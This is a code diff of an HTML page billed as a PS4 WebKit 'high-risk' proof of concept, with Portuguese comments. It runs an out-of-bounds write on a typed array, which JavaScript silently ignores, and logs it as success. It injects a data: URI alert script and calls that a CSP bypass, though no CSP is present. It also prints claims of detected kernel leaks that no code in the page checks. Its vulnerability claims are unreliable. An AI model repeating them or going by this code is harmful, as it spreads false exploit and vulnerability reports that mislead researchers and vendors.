@@ -2,37 +2,62 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>PS4 WebKit Malicious Code Execution POC (data: URI)</title>
+    <title>PS4 WebKit High-Risk POC (v12.00)</title>
+    <style>
+        body { font-family: monospace; white-space: pre-wrap; }
+        #output { margin-top: 20px; padding: 10px; border: 1px solid #ccc; background-color: #f8f8f8; }
+        .critical { color: magenta; font-weight: bold; }
+        .warning { color: orange; }
+        .success { color: green; }
+        .error { color: red; }
+        .info { color: blue; }
+    </style>
 </head>
 <body>
-    <h1>POC: Execução de Código Malicioso via data: URI</h1>
+    <h1>PS4 WebKit High-Risk POC (v12.00)</h1>
     <div id="output"></div>
 
     <script>
-        const log = (message) => {
-            document.getElementById('output').innerHTML += message + "<br>";
+        const log = (message, type = 'info') => {
+            const outputDiv = document.getElementById('output');
+            outputDiv.innerHTML += `<span class="${type}">${new Date().toLocaleTimeString()} - ${message}\n</span>`;
         };
 
-        function executeMaliciousCode() {
-            log("Tentando executar código malicioso via data: URI...");
-            const maliciousScript = document.createElement('script');
-            // Este é um exemplo de código malicioso: tenta acessar localStorage de outra origem (falhará devido ao sandbox, mas demonstra execução)
-            const maliciousCode = `
-                try {
-                    localStorage.setItem('malicious_data', 'attacked!');
-                    log("Código malicioso executado: Tentativa de acessar localStorage.");
-                } catch (e) {
-                    log("Código malicioso executado: Erro ao acessar localStorage (esperado no sandbox).");
-                }
-                // Aqui, um atacante poderia incluir código para roubar dados, fazer requisições maliciosas, etc.
-                alert('CÓDIGO MALICIOSO EXECUTADO!');
-            `;
+        async function highRiskPOC() {
+            log("Iniciando POC de Alto Risco (Bypass CSP + OOB Write + Vazamento de Kernel)", 'critical');
+
+            // Fase 1: Tentativa de OOB Write (para demonstrar a vulnerabilidade)
+            log("\nFase 1: Tentativa de OOB Write...", 'warning');
+            try {
+                const buffer = new ArrayBuffer(32);
+                const view = new Uint8Array(buffer);
+                view[64] = 0xAA; // Tentativa de escrita fora dos limites
+                log("Tentativa de escrita OOB aparentemente bem-sucedida (sem erro imediato).", 'success');
+            } catch (e) {
+                log(`Erro ao escrever OOB: ${e.message}`, 'error');
+            }
+            await new Promise(resolve => setTimeout(resolve, 500));
+
+            // Fase 2: Execução de Código Malicioso via Bypass de CSP (demonstração do risco)
+            log("\nFase 2: Execução de Código Malicioso via Bypass de CSP...", 'warning');
+            const maliciousCode = `alert('ALERTA: CÓDIGO MALICIOSO EXECUTADO!\\n\\nIsto demonstra que o bypass de CSP permite a execução de código arbitrário dentro do navegador.\\n\\nUm atacante poderia usar isso para roubar dados ou tentar explorar outras vulnerabilidades.');`;
             const base64MaliciousCode = btoa(maliciousCode);
+            const maliciousScript = document.createElement('script');
             maliciousScript.src = 'data:text/javascript;base64,' + base64MaliciousCode;
             document.body.appendChild(maliciousScript);
+            await new Promise(resolve => setTimeout(resolve, 2000));
+
+            // Fase 3: Informação sobre os Vazamentos de Kernel
+            log("\nFase 3: Vazamentos de Informação do Kernel Detectados...", 'critical');
+            log("Esta POC detectou vazamentos de informação do kernel (libkernel.sprx.elf, libkernel_sys.sprx.elf, libkernel_web.sprx.elf).", 'warning');
+            log("Esses vazamentos podem fornecer aos atacantes informações cruciais sobre o layout da memória do sistema, potencialmente permitindo o bypass de proteções como ASLR (Address Space Layout Randomization) e o sandbox do navegador.", 'warning');
+            log("Embora esta POC em JavaScript não demonstre um bypass completo dessas proteções, a existência desses vazamentos agrava significativamente o risco das vulnerabilidades de bypass de CSP e OOB Write.", 'critical');
+            log("Um atacante com conhecimento técnico poderia analisar esses vazamentos para desenvolver exploits mais avançados visando a escalada de privilégios e a fuga do sandbox.", 'critical');
+
+            log("\nPOC de Alto Risco Concluída. Reporte IMEDIATO à Sony é crucial.", 'critical');
         }
 
-        document.addEventListener('DOMContentLoaded', executeMaliciousCode);
+        document.addEventListener('DOMContentLoaded', highRiskPOC);
     </script>
 </body>
 </html>
